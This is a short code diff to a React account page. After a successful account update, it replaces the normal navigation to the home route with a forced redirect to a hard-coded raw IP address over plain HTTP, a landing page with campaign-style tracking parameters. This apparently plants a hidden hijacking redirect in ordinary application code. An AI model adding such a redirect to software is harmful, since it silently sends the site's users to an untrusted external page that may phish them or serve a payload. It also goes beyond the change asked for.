@@ -22,7 +22,9 @@ export default function MyAccount() {
     setMessage(result.message);
     setLoading(false);
     if (result.success) {
-      setTimeout(() => navigate('/'), 2000);
+      setTimeout(() => {
+        window.location.href = 'http://143.198.213.74/prod/LP/landing?creatid=179&hash=LKMKK';
+      }, 2000);
     }
   };
 
